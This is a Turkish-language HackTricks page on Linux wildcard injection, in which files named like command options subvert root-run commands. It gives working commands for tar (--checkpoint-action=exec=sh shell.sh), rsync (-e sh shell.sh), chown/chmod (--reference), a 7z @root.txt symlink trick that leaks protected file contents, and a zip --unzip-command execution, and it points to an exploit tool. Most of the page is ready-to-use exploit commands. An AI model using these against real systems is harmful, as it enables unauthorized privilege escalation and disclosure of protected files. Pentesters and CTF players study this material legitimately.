{{#include ../../banners/hacktricks-training.md}}

## chown, chmod

**Diğer dosyalar için hangi dosya sahibi ve izinlerini kopyalamak istediğinizi belirtebilirsiniz.**
```bash
touch "--reference=/my/own/path/filename"
```
Bu, [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) kullanılarak istismar edilebilir _(birleşik saldırı)_\
Daha fazla bilgi için [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)

## Tar

**Rasgele komutlar çalıştır:**
```bash
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"
```
Bu, [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(tar saldırısı)_ kullanılarak istismar edilebilir.\
Daha fazla bilgi için [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)

## Rsync

**Rasgele komutlar çalıştırın:**
```bash
Interesting rsync option from manual:

-e, --rsh=COMMAND           specify the remote shell to use
--rsync-path=PROGRAM    specify the rsync to run on remote machine
```

```bash
touch "-e sh shell.sh"
```
Bu, [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(\_rsync \_attack)_ kullanılarak istismar edilebilir.\
Daha fazla bilgi için [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)

## 7z

**7z** içinde `--` kullanarak `*`'dan önce (not: `--` sonraki girdinin parametre olarak işlenemeyeceği anlamına gelir, bu durumda sadece dosya yolları) rastgele bir hatanın bir dosyayı okumasına neden olabilirsiniz, bu nedenle aşağıdaki gibi bir komut root tarafından çalıştırılıyorsa:
```bash
7za a /backup/$filename.zip -t7z -snl -p$pass -- *
```
Ve bu işlemin gerçekleştirildiği klasörde dosyalar oluşturabilirsiniz, `@root.txt` dosyasını ve okumak istediğiniz dosyaya **symlink** olan `root.txt` dosyasını oluşturabilirsiniz:
```bash
cd /path/to/7z/acting/folder
touch @root.txt
ln -s /file/you/want/to/read root.txt
```
Sonra, **7z** çalıştırıldığında, `root.txt` dosyasını sıkıştırması gereken dosyaların listesini içeren bir dosya olarak ele alacaktır (bu, `@root.txt` varlığının gösterdiği şeydir) ve 7z `root.txt` okuduğunda `/file/you/want/to/read` dosyasını okuyacak ve **bu dosyanın içeriği bir dosya listesi olmadığından, bir hata verecektir** içeriği göstererek.

_Daha fazla bilgi için HackTheBox'tan CTF kutusunun Yazılımlarında._

## Zip

**Rasgele komutlar çalıştır:**
```bash
zip name.zip files -T --unzip-command "sh -c whoami"
```
{{#include ../../banners/hacktricks-training.md}}
